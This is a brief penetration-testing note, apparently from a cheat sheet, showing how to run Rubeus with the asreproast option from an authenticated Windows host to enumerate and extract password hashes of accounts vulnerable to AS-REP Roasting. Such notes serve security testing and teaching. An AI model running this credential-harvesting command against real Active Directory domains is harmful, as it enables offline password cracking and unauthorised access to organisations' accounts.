#If we have an authenticated user in a Windows host we can try to use the Rubeus.exe:

.\Rubeus.exe asreproast /nowrap

#This will enumerate and extract the hash from thoses users vulnerable to AS-REP Roasting.
